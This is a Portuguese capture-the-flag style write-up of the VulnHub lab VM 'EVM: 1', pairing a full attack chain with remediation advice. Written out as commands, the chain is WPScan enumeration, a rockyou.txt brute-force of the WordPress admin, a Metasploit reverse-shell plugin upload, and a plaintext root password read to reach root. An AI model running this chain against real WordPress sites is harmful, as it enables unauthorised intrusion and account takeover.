# EVM: 1 — WordPress, Metasploit e uma Senha Root num Arquivo de Texto

Olha rapaziada!! EVM: 1 é o tipo de máquina que mostra exatamente como um comprometimento real de WordPress funciona do começo ao fim. Um comentário HTML vaza o caminho do WordPress, o WPScan encontra um plugin vulnerável, a senha do admin cai pro rockyou.txt em segundos, o Metasploit entrega uma sessão Meterpreter, e então... a senha do root tá simplesmente num arquivo de texto na home de alguém. Mano. Não fica mais "má prática do mundo real" do que isso, fr fr.

| Campo | Valor |
|---|---|
| **Nível** | Fácil |
| **VM Alvo** | EVM: 1 |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/evm-1,391/ |
| **Técnicas** | Nmap, análise de comentário HTML no código-fonte, enumeração WordPress com WPScan, brute-force da senha admin, Metasploit wp\_admin\_shell\_upload, descoberta de credencial no sistema de arquivos |
| **CVEs** | CWE-312 (Armazenamento em Texto Claro de Informação Sensível), autenticação WordPress + upload de shell via plugin |
| **Grupos APT** | Atores oportunistas e grupos de crypto-mining usam upload autenticado de shell WordPress em campanhas de exploração em massa; APT41 usa sites WordPress como staging para acesso inicial |

---

## Resumo do Ataque

```
nmap → SSH/22, DNS/53, HTTP/80, POP3/110, IMAP/143, SMB/139+445
  → HTTP: página padrão Apache → comentário HTML: /wordpress/
  → WPScan: plugin c0rrupt3d_brain, usuário c0rrupt3d_brain
  → WPScan brute-force rockyou.txt → senha: 24992499
  → Metasploit wp_admin_shell_upload → Meterpreter (www-data)
  → shell → /home/root3r/.root_password_ssh.txt → willy26
  → su root → uid=0(root)
  → /root/proof.txt
```

---

## Metodologia

1. Scan completo de portas para enumerar todos os serviços
2. Análise do código-fonte HTTP para descobrir o caminho oculto da instalação WordPress
3. WPScan para enumerar plugins, temas e usuários
4. Brute-force da senha admin contra o login WordPress
5. Upload autenticado de shell via Metasploit para RCE
6. Enumeração do sistema de arquivos no pós-exploração para encontrar senha root em texto claro
7. su root com a senha recuperada

---

## Passo 1 — Descoberta de Host e Scan de Portas

```bash
sudo netdiscover -r 192.168.1.0/24
# Alvo: 192.168.1.103

nmap -A -p- 192.168.1.103
```

```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.x
53/tcp  open  domain      (DNS)
80/tcp  open  http        Apache httpd 2.4.x
110/tcp open  pop3
139/tcp open  netbios-ssn
143/tcp open  imap
445/tcp open  microsoft-ds
```

Sete serviços. HTTP na porta 80 é a principal superfície de ataque. Começar por aí.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Enumeração Web: Vazamento por Comentário HTML

Navegar para `http://192.168.1.103`. A página padrão do Apache carrega, mas tem mais do que aparenta:

```bash
curl -s http://192.168.1.103/ | grep -i "wordpress\|wp-\|comment"
```

O código-fonte HTML contém um comentário revelando o caminho da instalação WordPress:

```html
<!-- wordpress @ /wordpress/ -->
```

Confirmar com brute-force de diretórios:

```bash
dirb http://192.168.1.103/
# ou
gobuster dir -u http://192.168.1.103/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Navegar para `http://192.168.1.103/wordpress/`.

**Nota do mundo real:** Desenvolvedores deixam comentários TODO, notas de debug e referências de caminhos em código de produção constantemente. OWASP A05:2021 (Misconfiguration de Segurança) cobre exatamente isso. Varredura DAST automatizada pega esses antes dos atacantes.

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios; T1552.001 — Credenciais em Arquivos

---

## Passo 3 — Enumeração WordPress com WPScan

```bash
wpscan --url http://192.168.1.103/wordpress/ \
  -e at \
  -e ap \
  -e u \
  --api-token SEU_TOKEN_WPSCAN
```

Achados principais:
- Plugin vulnerável: `c0rrupt3d_brain`
- Usuário WordPress: `c0rrupt3d_brain`

**MITRE ATT&CK:** T1596 — Pesquisa em Bancos de Dados Técnicos Abertos; T1592 — Coleta de Informações do Host da Vítima

---

## Passo 4 — Brute-Force da Senha Admin WordPress

```bash
wpscan --url http://192.168.1.103/wordpress \
  -U c0rrupt3d_brain \
  -P /usr/share/wordlists/rockyou.txt \
  --password-attack xmlrpc
```

**Senha recuperada:** `24992499`

A senha estava no rockyou.txt, o que significa que estava em um dump de violação de dados massivo. Qualquer atacante com rockyou.txt e WPScan vai quebrar isso em menos de um minuto.

**MITRE ATT&CK:** T1110.003 — Força Bruta: Password Spraying; T1078 — Contas Válidas

---

## Passo 5 — Exploração: Metasploit wp\_admin\_shell\_upload

```bash
msfconsole -q
msf> use exploit/unix/webapp/wp_admin_shell_upload
msf> set RHOSTS 192.168.1.103
msf> set TARGETURI /wordpress
msf> set USERNAME c0rrupt3d_brain
msf> set PASSWORD 24992499
msf> set LHOST <ip_atacante>
msf> run
```

Sessão Meterpreter abre como `www-data`.

**O que aconteceu:** O módulo loga no admin WordPress, faz upload de um plugin PHP malicioso contendo payload de reverse shell, o ativa e aciona o callback. Caminho padrão de RCE autenticado WordPress.

**MITRE ATT&CK:** T1190 — Exploração de Aplicação Pública; T1059.004 — Interpretador de Comandos: Unix Shell

---

## Passo 6 — Pós-Exploração: Descoberta de Credencial

Da sessão Meterpreter:

```bash
# Entrar no shell do sistema
shell

# Estabilizar
python -c 'import pty; pty.spawn("/bin/bash")'

# Enumerar diretórios home
ls /home/
# root3r

ls -la /home/root3r/
# .root_password_ssh.txt

cat /home/root3r/.root_password_ssh.txt
# willy26
```

Uma senha root em texto claro. Num diretório home. Acessível pelo www-data. Isso é CWE-312 na sua forma mais pura.

**Nota do mundo real:** Sysadmins e desenvolvedores armazenam senhas em arquivos de texto "temporariamente" o tempo todo e depois esquecem. Scripts automatizados de pós-exploração pesquisam todos os diretórios home por arquivos com nomes como `*pass*`, `*cred*`, `*secret*`, `*key*` imediatamente após ganhar shell.

**MITRE ATT&CK:** T1552.001 — Credenciais em Arquivos; T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 7 — Escalação de Privilégio para Root

```bash
# Spawn de TTY adequado primeiro
python -c 'import pty; pty.spawn("/bin/bash")'

# Trocar para root
su root
Password: willy26

# Verificar
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/proof.txt
```

Root obtido. Sensacional!

**MITRE ATT&CK:** T1078 — Contas Válidas; T1548 — Mecanismo de Controle de Elevação

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado em | Usado Para |
|---|---|---|---|
| Credencial | c0rrupt3d\_brain:24992499 | Brute-force WPScan | Login admin WordPress |
| Credencial | root:willy26 | /home/root3r/.root\_password\_ssh.txt | su root |
| Shell | www-data via Meterpreter | wp\_admin\_shell\_upload | Acesso pós-exploração |
| Flag root | proof.txt | /root/proof.txt | Capturada |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Conclusão |
|---|---|---|---|
| 1 | Caminho WordPress vazado em comentário HTML | Código de produção regularmente contém comentários de debug expondo caminhos internos | Remover todos os comentários de desenvolvedor antes do deploy; usar varredura DAST no CI/CD |
| 2 | Plugin WordPress vulnerável com RCE conhecido | Vulnerabilidades em plugins WordPress são a causa número 1 de comprometimentos WordPress | Auditar todos os plugins instalados; remover os não utilizados; assinar alertas WPScan |
| 3 | Senha admin no rockyou.txt | Milhões de usuários têm senhas no rockyou.txt; qualquer senha num dump de violação é efetivamente pública | Senhas fortes e únicas; MFA em todas as interfaces admin |
| 4 | Upload autenticado WordPress levando a RCE | Qualquer admin WordPress autenticado pode instalar plugins, tornando o comprometimento de credencial admin equivalente a RCE | Desabilitar gerenciamento de plugins em produção: `define('DISALLOW_FILE_MODS', true)` |
| 5 | Senha root em arquivo texto no diretório home | Desenvolvedores deixam credenciais em arquivos "temporariamente" constantemente | Nunca armazenar credenciais em arquivos do sistema de arquivos; usar gerenciador de segredos |

---

## MITRE ATT&CK

| Fase | Tática | Técnica | ID |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Reconhecimento | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Acesso Inicial | Acesso Inicial | Exploração de Aplicação Pública | T1190 |
| Acesso a Credenciais | Acesso a Credenciais | Força Bruta: Password Spraying | T1110.003 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais em Arquivos | T1552.001 |
| Execução | Execução | Interpretador de Comandos: Unix Shell | T1059.004 |
| Descoberta | Descoberta | Descoberta de Informações do Sistema | T1082 |
| Escalação de Privilégio | Escalação de Privilégio | Contas Válidas | T1078 |
| Escalação de Privilégio | Escalação de Privilégio | Mecanismo de Controle de Elevação | T1548 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Remover comentários HTML do código de produção** — sem caminhos, credenciais ou informações de debug em HTML implantado
2. **Atualizar ou remover plugins WordPress vulneráveis** — auditar todos os plugins instalados; assinar feed de vulnerabilidades WPScan
3. **Senhas fortes com MFA** — senha admin não deve constar em nenhum dump de violação; adicionar MFA ao admin WordPress
4. **Desabilitar modificações de arquivos no WordPress** — adicionar `define('DISALLOW_FILE_MODS', true)` ao wp-config.php
5. **Nunca armazenar credenciais em arquivos do sistema de arquivos** — usar gerenciador de segredos; aplicar política de proibição de credenciais em texto claro

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gerenciamento de Ativos | Inventariar instalações WordPress; rastrear versões de plugins |
| Proteger | Controle de Acesso | MFA no admin WordPress; restringir admin a IPs específicos |
| Proteger | Segurança de Dados | Remover todos os arquivos de credencial em texto claro |
| Detectar | Anomalias e Eventos | Alertar em novas instalações de plugins; monitorar diretórios /home para arquivos de credencial |
| Responder | Planejamento de Resposta | Rotacionar todas as credenciais; remover plugins maliciosos; reconstruir WordPress se comprometido |
| Recuperar | Planejamento de Recuperação | Restaurar de backup limpo; aplicar todos os patches antes de colocar de volta online |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Controle de Acesso | Restringir admin WordPress a IPs autorizados |
| AC-6 | Mínimo Privilégio | Desabilitar gerenciamento de plugins em produção WordPress |
| IA-2(1) | Autenticação Multifator | MFA para todas as contas admin WordPress |
| IA-5 | Gerenciamento de Autenticadores | Senhas fortes e únicas; sem senhas de dumps de violação |
| CM-7 | Funcionalidade Mínima | Remover plugins, temas e usuários não utilizados |
| SC-28 | Proteção de Informação em Repouso | Sem credenciais em texto claro no sistema de arquivos |

### CISA KEV

Vulnerabilidades de upload autenticado em WordPress e padrões de credencial fraca aparecem em múltiplos Alertas CISA (AA21-008A, AA22-074A). CISA aconselha organizações a aplicar patches imediatamente e auditar todas as instalações WordPress.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gerenciamento de Identidade e Acesso (IAM) | Gerenciar Privilégios e Contas | MIL3 |
| Gestão de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade | MIL2 |
| Gestão de Ativos, Mudanças e Configurações (ASSET) | Gerenciar Inventário de Ativos de TI | MIL2 |

### MITRE D3FEND

- **D3-ACH** — Hardening de Configuração de Aplicação (DISALLOW\_FILE\_MODS; MFA no admin)
- **D3-OAM** — Gerenciamento Administrativo do SO (sem arquivos de credencial em texto claro)
- **D3-HBPI** — Hardening da Integridade do Pipeline de Build (varredura DAST; remover comentários de debug)

---

## Considerações Finais

EVM: 1 é uma máquina perfeita para iniciantes porque cada passo é um achado do mundo real que você vai encontrar em ambientes de produção. WordPress com Apache padrão, caminho vazado em comentário HTML, plugin com RCE conhecido, senha no rockyou.txt e então senha root num arquivo de texto. Cada vulnerabilidade existe em empresas reais agora mesmo. A cadeia do HTTP até o root aqui é exatamente a mesma que atores de ameaça seguem em campanhas de comprometimento massivo de WordPress. gg rapaziada, top demais essa máquina.

Thanks guys!! (❍ᴥ❍ʋ)
